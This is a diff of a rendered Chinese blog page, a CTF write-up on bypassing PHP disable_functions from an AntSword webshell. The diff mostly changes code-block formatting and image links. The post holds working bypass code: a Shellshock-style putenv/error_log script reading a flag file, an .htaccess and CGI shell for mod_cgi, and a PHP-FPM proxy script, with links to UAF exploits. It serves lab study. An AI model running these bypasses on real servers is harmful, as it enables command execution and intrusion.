@@ -80,7 +80,7 @@
         <p>剑未配妥出门已是江湖，千帆过尽归来仍是少年。</p>
         <div class="top-social_v2">
           <li id="bg-pre">
-            <img class="flipx" src="/img/other/next-b.svg">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/other/next-b.svg">
           </li>
           
             
@@ -121,7 +121,7 @@
             
           
           <li id="bg-next">
-            <img src="/img/other/next-b.svg">
+            <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/other/next-b.svg">
           </li>
         </div>
       </div>
@@ -195,9 +195,9 @@
                   <ul class="sub-menu">
                     
                       <li>
-                        <a href="/categories/技术/">
+                        <a href="/categories/ctf/">
                           <i class="fa fa-code" aria-hidden="true"></i>
-                          技术
+                          ctf
                         </a>
                       </li>
                     
@@ -281,19 +281,36 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
 <div class="pattern-center-blank"></div>
 
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://api.yimian.xyz/img?type=moe);" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://api.yimian.xyz/img?type=moe">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      Bypass disable_function</h1>
+      <p class="entry-census">
+        <span>
+          <a href="cns1rius.github.io">
+            <img src="/img/custom/avatar.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="cns1rius.github.io">s1rius</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2022-8-29<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
       <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
         <div class="toc"></div>
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
-        
-          <header class="entry-header">
-            <h1 class="entry-title">Bypass disable_function</h1>
-            <p class="entry-census">s1rius&nbsp;·&nbsp;2022-8-29&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
-
-            <hr>
-          </header>
         
         <div class="entry-content">
           <h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><p>时间紧 于是先采用最省时的方法<br>先蚁剑连<br><img src="https://img-blog.csdnimg.cn/5939a50eab1c40fe8eff4ae65dc3b730.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现打不开flag文件<br>要使用蚁剑插件<code>绕过disabled function</code></p>
@@ -305,14 +322,7 @@
 <blockquote>
 <p>如果环境变量的值以字符() {开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在shell启动的时候才生效。</p>
 </blockquote>
-<p>脚本</p>
-<pre><code class="php">&lt;?php
-$cmd = &quot; tac /flag&gt;/var/www/html/1.txt&quot;;
-putenv(&quot;PHP_DMIND=() { :; };$cmd&quot;);
-error_log(&quot;dmind&quot;,1); 
-echo file_get_contents(&quot;/var/www/html/1.txt&quot;);
-?&gt;
-</code></pre>
+<p>脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">" tac /flag&gt;/var/www/html/1.txt"</span>;</span><br><span class="line">putenv(<span class="string">"PHP_DMIND=() &#123; :; &#125;;$cmd"</span>);</span><br><span class="line">error_log(<span class="string">"dmind"</span>,<span class="number">1</span>); </span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/var/www/html/1.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>用蚁剑传进去后<br>浏览器访问这个文件即可在1.txt看到flag<br><img src="https://img-blog.csdnimg.cn/3d91c09a976d423dac82102531093e0c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
 <h1 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h1><p><img src="https://img-blog.csdnimg.cn/b725c6e6ac734ae483c2f7810f7d639d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
 <p>如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令</p>
@@ -326,88 +336,15 @@ echo file_get_contents(&quot;/var/www/html/1.txt&quot;);
 <li>必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</li>
 <li>必须有权限写.htaccess文件</li>
 </ol>
-<h2 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h2><p>.htaccess</p>
-<pre><code class="handlebars">Options +ExecCGI
-AddHandler cgi-script .cgi   
-</code></pre>
-<p>shell.cgi</p>
-<pre><code class="shell">#!/bin/sh
-echo&amp;&amp;cd &quot;/var/www/html/backdoor&quot;;cat shell.cgi;echo 96642;pwd;echo c26b314f4b
-</code></pre>
+<h2 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h2><p>.htaccess<br><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .cgi</span><br></pre></td></tr></table></figure></p>
+<p>shell.cgi<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/sh</span><br><span class="line">echo&amp;&amp;cd "/var/www/html/backdoor";cat shell.cgi;echo 96642;pwd;echo c26b314f4b</span><br></pre></td></tr></table></figure></p>
 <h2 id="简单方法："><a href="#简单方法：" class="headerlink" title="简单方法："></a>简单方法：</h2><p>蚁剑连<br>还是那个插件bypass！<br><img src="https://img-blog.csdnimg.cn/62979eb3a1e84ce580aad7229184b420.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
 <h1 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h1><ol>
 <li>FPM是fast-cgi的协议解析器</li>
 <li>webserver使用cgi协议封装好用户的请求发送给FPM</li>
 <li>FPM按照cgi的协议将TCP流解析成真正的数据</li>
 </ol>
-<p><img src="https://img-blog.csdnimg.cn/fd9b0f38878649ae853da3e31f36780c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>蚁剑bypass<br>模式：FPM<br>地址：127.0.0.1：9000或localhost：9000<br>植入后修改shell地址为http://……/.antproxy.php</p>
-<pre><code class="php">&lt;?php
-function get_client_header(){
-    $headers=array();
-    foreach($_SERVER as $k=&gt;$v){
-        if(strpos($k,&#39;HTTP_&#39;)===0){
-            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));
-            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);
-            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);
-            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);
-            if($k==&#39;Host&#39;) continue;
-            $headers[]=&quot;$k:$v&quot;;
-        }
-    }
-    return $headers;
-}
-function header_callback($str){
-    return strtoupper($str[0]);
-}
-function parseHeader($sResponse){
-    list($headerstr,$sResponse)=explode(&quot;
-&quot;,$sResponse, 2);
-    $ret=array($headerstr,$sResponse);
-    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){
-        $ret=parseHeader($sResponse);
-    }
-    return $ret;
-}
-set_time_limit(120);
-$headers=get_client_header();
-$host = &quot;127.0.0.1&quot;;
-$port = 61921;
-$errno = &#39;&#39;;
-$errstr = &#39;&#39;;
-$timeout = 30;
-$url = &quot;/index.php&quot;;
-if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){
-    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];
-};
-$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
-if(!$fp){
-    return false;
-}
-$method = &quot;GET&quot;;
-$post_data = &quot;&quot;;
-if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {
-    $method = &quot;POST&quot;;
-    $post_data = file_get_contents(&#39;php://input&#39;);
-}
-$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;
-$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
-if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {
-    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;
-}
-$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;
-$out .= implode(&quot;\r\n&quot;,$headers);
-$out .= &quot;\r\n\r\n&quot;;
-$out .= &quot;&quot;.$post_data;
-fputs($fp, $out);
-$response = &#39;&#39;;
-while($row=fread($fp, 4096)){
-    $response .= $row;
-}
-fclose($fp);
-$pos = strpos($response, &quot;\r\n\r\n&quot;);
-$response = substr($response, $pos+4);
-echo $response;
-</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/fd9b0f38878649ae853da3e31f36780c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>蚁剑bypass<br>模式：FPM<br>地址：127.0.0.1：9000或localhost：9000<br>植入后修改shell地址为http://……/.antproxy.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_header</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $headers=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($k,<span class="string">'HTTP_'</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            $k=strtolower(preg_replace(<span class="string">'/^HTTP/'</span>, <span class="string">''</span>, $k));</span><br><span class="line">            $k=preg_replace_callback(<span class="string">'/_\w/'</span>,<span class="string">'header_callback'</span>,$k);</span><br><span class="line">            $k=preg_replace(<span class="string">'/^_/'</span>,<span class="string">''</span>,$k);</span><br><span class="line">            $k=str_replace(<span class="string">'_'</span>,<span class="string">'-'</span>,$k);</span><br><span class="line">            <span class="keyword">if</span>($k==<span class="string">'Host'</span>) <span class="keyword">continue</span>;</span><br><span class="line">            $headers[]=<span class="string">"$k:$v"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $headers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">header_callback</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strtoupper($str[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseHeader</span><span class="params">($sResponse)</span></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($headerstr,$sResponse)=explode(<span class="string">"</span></span><br><span class="line"><span class="string">"</span>,$sResponse, <span class="number">2</span>);</span><br><span class="line">    $ret=<span class="keyword">array</span>($headerstr,$sResponse);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^HTTP/1.1 d&#123;3&#125;/'</span>, $sResponse))&#123;</span><br><span class="line">        $ret=parseHeader($sResponse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ret;</span><br><span class="line">&#125;</span><br><span class="line">set_time_limit(<span class="number">120</span>);</span><br><span class="line">$headers=get_client_header();</span><br><span class="line">$host = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$port = <span class="number">61921</span>;</span><br><span class="line">$errno = <span class="string">''</span>;</span><br><span class="line">$errstr = <span class="string">''</span>;</span><br><span class="line">$timeout = <span class="number">30</span>;</span><br><span class="line">$url = <span class="string">"/index.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[<span class="string">'QUERY_STRING'</span>]))&#123;</span><br><span class="line">    $url .= <span class="string">"?"</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">&#125;;</span><br><span class="line">$fp = fsockopen($host, $port, $errno, $errstr, $timeout);</span><br><span class="line"><span class="keyword">if</span>(!$fp)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$method = <span class="string">"GET"</span>;</span><br><span class="line">$post_data = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REQUEST_METHOD'</span>]==<span class="string">'POST'</span>) &#123;</span><br><span class="line">    $method = <span class="string">"POST"</span>;</span><br><span class="line">    $post_data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$out = $method.<span class="string">" "</span>.$url.<span class="string">" HTTP/1.1\r\n"</span>;</span><br><span class="line">$out .= <span class="string">"Host: "</span>.$host.<span class="string">":"</span>.$port.<span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[<span class="string">'CONTENT_TYPE'</span>])) &#123;</span><br><span class="line">    $out .= <span class="string">"Content-Type: "</span>.$_SERVER[<span class="string">'CONTENT_TYPE'</span>].<span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$out .= <span class="string">"Content-length:"</span>.strlen($post_data).<span class="string">"\r\n"</span>;</span><br><span class="line">$out .= implode(<span class="string">"\r\n"</span>,$headers);</span><br><span class="line">$out .= <span class="string">"\r\n\r\n"</span>;</span><br><span class="line">$out .= <span class="string">""</span>.$post_data;</span><br><span class="line">fputs($fp, $out);</span><br><span class="line">$response = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">while</span>($row=fread($fp, <span class="number">4096</span>))&#123;</span><br><span class="line">    $response .= $row;</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">$pos = strpos($response, <span class="string">"\r\n\r\n"</span>);</span><br><span class="line">$response = substr($response, $pos+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">echo</span> $response;</span><br></pre></td></tr></table></figure></p>
 <h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h2><blockquote>
 <p>利用的是PHP Garbage Collector程序中的堆溢出触发</p>
 </blockquote>
@@ -428,74 +365,7 @@ echo $response;
 <li>github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9/</li>
 <li><a href="https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80" target="_blank" rel="noopener">https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80</a></li>
 </ul>
-<pre><code class="php">&lt;?php
-function get_client_header(){
-    $headers=array();
-    foreach($_SERVER as $k=&gt;$v){
-        if(strpos($k,&#39;HTTP_&#39;)===0){
-            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));
-            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);
-            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);
-            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);
-            if($k==&#39;Host&#39;) continue;
-            $headers[]=&quot;$k:$v&quot;;
-        }
-    }
-    return $headers;
-}
-function header_callback($str){
-    return strtoupper($str[0]);
-}
-function parseHeader($sResponse){
-    list($headerstr,$sResponse)=explode(&quot;
-&quot;,$sResponse, 2);
-    $ret=array($headerstr,$sResponse);
-    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){
-        $ret=parseHeader($sResponse);
-    }
-    return $ret;
-}
-set_time_limit(120);
-$headers=get_client_header();
-$host = &quot;127.0.0.1&quot;;
-$port = 63947;
-$errno = &#39;&#39;;
-$errstr = &#39;&#39;;
-$timeout = 30;
-$url = &quot;/index.php&quot;;
-if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){
-    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];
-};
-$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
-if(!$fp){
-    return false;
-}
-$method = &quot;GET&quot;;
-$post_data = &quot;&quot;;
-if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {
-    $method = &quot;POST&quot;;
-    $post_data = file_get_contents(&#39;php://input&#39;);
-}
-$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;
-$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
-if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {
-    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;
-}
-$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;
-$out .= implode(&quot;\r\n&quot;,$headers);
-$out .= &quot;\r\n\r\n&quot;;
-$out .= &quot;&quot;.$post_data;
-fputs($fp, $out);
-$response = &#39;&#39;;
-while($row=fread($fp, 4096)){
-    $response .= $row;
-}
-fclose($fp);
-$pos = strpos($response, &quot;\r\n\r\n&quot;);
-$response = substr($response, $pos+4);
-echo $response;
-</code></pre>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_header</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $headers=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($k,<span class="string">'HTTP_'</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            $k=strtolower(preg_replace(<span class="string">'/^HTTP/'</span>, <span class="string">''</span>, $k));</span><br><span class="line">            $k=preg_replace_callback(<span class="string">'/_\w/'</span>,<span class="string">'header_callback'</span>,$k);</span><br><span class="line">            $k=preg_replace(<span class="string">'/^_/'</span>,<span class="string">''</span>,$k);</span><br><span class="line">            $k=str_replace(<span class="string">'_'</span>,<span class="string">'-'</span>,$k);</span><br><span class="line">            <span class="keyword">if</span>($k==<span class="string">'Host'</span>) <span class="keyword">continue</span>;</span><br><span class="line">            $headers[]=<span class="string">"$k:$v"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $headers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">header_callback</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strtoupper($str[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseHeader</span><span class="params">($sResponse)</span></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($headerstr,$sResponse)=explode(<span class="string">"</span></span><br><span class="line"><span class="string">"</span>,$sResponse, <span class="number">2</span>);</span><br><span class="line">    $ret=<span class="keyword">array</span>($headerstr,$sResponse);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^HTTP/1.1 d&#123;3&#125;/'</span>, $sResponse))&#123;</span><br><span class="line">        $ret=parseHeader($sResponse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ret;</span><br><span class="line">&#125;</span><br><span class="line">set_time_limit(<span class="number">120</span>);</span><br><span class="line">$headers=get_client_header();</span><br><span class="line">$host = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$port = <span class="number">63947</span>;</span><br><span class="line">$errno = <span class="string">''</span>;</span><br><span class="line">$errstr = <span class="string">''</span>;</span><br><span class="line">$timeout = <span class="number">30</span>;</span><br><span class="line">$url = <span class="string">"/index.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[<span class="string">'QUERY_STRING'</span>]))&#123;</span><br><span class="line">    $url .= <span class="string">"?"</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">&#125;;</span><br><span class="line">$fp = fsockopen($host, $port, $errno, $errstr, $timeout);</span><br><span class="line"><span class="keyword">if</span>(!$fp)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$method = <span class="string">"GET"</span>;</span><br><span class="line">$post_data = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REQUEST_METHOD'</span>]==<span class="string">'POST'</span>) &#123;</span><br><span class="line">    $method = <span class="string">"POST"</span>;</span><br><span class="line">    $post_data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$out = $method.<span class="string">" "</span>.$url.<span class="string">" HTTP/1.1\r\n"</span>;</span><br><span class="line">$out .= <span class="string">"Host: "</span>.$host.<span class="string">":"</span>.$port.<span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[<span class="string">'CONTENT_TYPE'</span>])) &#123;</span><br><span class="line">    $out .= <span class="string">"Content-Type: "</span>.$_SERVER[<span class="string">'CONTENT_TYPE'</span>].<span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$out .= <span class="string">"Content-length:"</span>.strlen($post_data).<span class="string">"\r\n"</span>;</span><br><span class="line">$out .= implode(<span class="string">"\r\n"</span>,$headers);</span><br><span class="line">$out .= <span class="string">"\r\n\r\n"</span>;</span><br><span class="line">$out .= <span class="string">""</span>.$post_data;</span><br><span class="line">fputs($fp, $out);</span><br><span class="line">$response = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">while</span>($row=fread($fp, <span class="number">4096</span>))&#123;</span><br><span class="line">    $response .= $row;</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">$pos = strpos($response, <span class="string">"\r\n\r\n"</span>);</span><br><span class="line">$response = substr($response, $pos+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">echo</span> $response;</span><br></pre></td></tr></table></figure>
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
@@ -528,7 +398,7 @@ echo $response;
           
             <a href="/2022/08/ctfhub-rce/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://api.yimian.xyz/img?type=moe" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://api.yimian.xyz/img?type=moe">
               </div>
               <span class="label">
               Previous Post</span>
@@ -546,7 +416,7 @@ echo $response;
           
             <a href="/2022/08/免密ssh登录/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://gcore.jsdelivr.net/npm/ushio-api-img-moe@5.0.6/img_64_1653x1039_72.0089950561523_null_normal.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://gcore.jsdelivr.net/npm/ushio-api-img-moe@5.0.6/img_64_1653x1039_72.0089950561523_null_normal.jpg">
               </div>
               <span class="label">
               Next Post</span>
@@ -763,9 +633,9 @@ $(document).ready(function() {
           <ul class="sub-menu">
             
               <li>
-                <a href="/categories/技术/">
+                <a href="/categories/ctf/">
                   <i class="fa fa-code" aria-hidden="true"></i>
-                  技术
+                  ctf
                 </a>
               </li>
             
